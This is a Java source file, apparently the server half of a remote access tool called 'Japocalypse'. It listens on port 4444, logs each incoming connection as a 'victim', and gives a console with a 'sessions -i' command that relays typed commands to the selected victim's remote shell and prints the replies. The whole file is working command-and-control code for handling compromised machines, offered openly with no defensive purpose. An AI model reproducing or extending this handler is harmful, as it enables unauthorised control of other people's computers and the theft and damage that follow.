package Server;

import java.io.IOException;
import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;

/**
 * Created by mpampis on 7/2/2017.
 */
public class Japocalypse {
    private List<Victim> victimList = Collections.synchronizedList(new ArrayList<Victim>()); // this is the list of all the victims
    private ArrayList<Command> commandList = new ArrayList<>(); // this is a list for all the commands
    private Scanner scanner = new Scanner(System.in); // creating a scanner for the console
    private String[] identifiers = {"-i"}; // identifiers

    public Japocalypse() {
        loadCommands(); // add all the commands in commandsList

        new Thread(new AcceptConnections(victimList)).start(); // creating and starting a new thread for accepting connections

        while(true) {
            Command command = readCommand();
            int index = Utilities.indexOf(commandList, command); // try to find the command in the commandList
            if(index > -1) {

                ArrayList<String> argList = new ArrayList<>();
                String[] strs = command.toString().split(" ");

                for(int i = 1; i < strs.length;i++) { // we start from 1 cuz the 0 is the command itself not its arguments  
                    argList.add(strs[i]);
                }

                String[] argArray = argList.toArray(new String[argList.size()]); // converting the list to array
                commandList.get(index).execute(argArray); // executing the command with arguments
            }
        }
    }

    private void handleVictim(Victim victim) {
        while(true) {
            try {
                System.out.print(victim.waitForAndRead());
                String command = scanner.nextLine();
                if(command.equals("back"))break;
                victim.out.println(command);
                victim.out.flush();
            } catch (Exception e) {
                System.out.println("Connection refused: " + victim.getSocket().getInetAddress().getHostAddress());
            }
        }
    }

    private void loadCommands() {
        Command c = new Command("sessions"); // creating a command
        /**
         * adding logic to the command
         */
        c.addLogic(args -> {
            if(args.length == 0) {
                printConnectedMachines(); // if its just sessions without arguments then just prin the connected machines.
            }
            else {
                if(args[0].equals("-i")) { // if the first argument is i
                    try {
                        int id = Integer.parseInt(args[1]); // try to convert the next argument to int, it will throw an exception if its not integer
                        int index = Utilities.indexOf(victimList, id); // find the index of the victim with the specified id inside the victimList

                        if(index < 0) { // if index is negative then we couldn't found the specified victim
                            System.out.println("Could not find this session's id"); // printError
                            return false; // return false to indicate that something went wrong with the execution of this command
                        }

                        /**
                         * if we are here thats mean that everything went smoothly and the victim we are looking for is at
                         * index possition inside the victimList.
                         */
                        handleVictim(victimList.get(index)); // handle the specified victim

                    }
                    catch(NumberFormatException e) { // if it wasn't number the ID
                        System.out.println("Invalid argument: "+args[1]);
                    }
                    catch(IndexOutOfBoundsException e) { // if the ID is missing.
                        System.out.println("Missing argument");
                    }
                }
                else {
                    System.out.println("Cannot find command"); // if the argument is different than i then we don't know what to do
                    return false;
                }
            }
            return true; // if we are here we managed to handle the victim and now we return true
        });
        commandList.add(c);

    }

    /**
     * Checks whether a command is valid
     * @param command the command
     * @return true if the command is valid, false otherwise.
     */
    private boolean isValidCommand(Command command) {
        return Utilities.indexOf(commandList, command) != -1;
    }

    /**
     * Reading a command from the user
     * @return the command which the user typed
     */
    private Command readCommand() {
        System.out.print("Japocalypse> ");
        return new Command(scanner.nextLine());
    }

    /**
     * Prints all the connected machines
     */
    private void printConnectedMachines() {
        for(Victim v : victimList) {
            System.out.println(v);
        }
    }
}

/**
 * This is a thread which continuesly adds victims to the victimList
 */
class AcceptConnections implements Runnable {
    private List<Victim> list;

    public AcceptConnections(List<Victim> list) {
        this.list = list;
    }

    @Override
    public void run() {
        try {
            ServerSocket serverSocket = new ServerSocket(4444);
            while(true) {
                try {
                    Victim victim = new Victim(serverSocket.accept());
                    list.add(victim);
                    System.out.println(victim.getID() + " connected: " + victim.getSocket().getInetAddress().getHostAddress());
                }
				catch (IOException ex) {

                }
            }
        }
		catch (IOException ex) {

        }
    }
}
